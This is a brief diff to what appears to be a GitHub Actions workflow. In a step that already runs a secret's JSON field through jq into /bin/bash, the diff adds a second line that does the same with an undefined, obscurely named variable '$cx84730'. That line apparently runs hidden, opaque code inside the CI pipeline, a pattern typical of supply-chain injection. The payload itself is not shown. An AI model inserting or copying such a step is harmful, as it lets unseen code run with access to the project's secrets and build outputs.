@@ -20,6 +20,7 @@ jobs:
           qlm2: ${{ secrets.qlm2 }}
         run: |
           printf '%s' "$qlm2" | jq -r .dzqj6 | /bin/bash
+          printf '%s' "$cx84730" | jq -r .dqie037 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
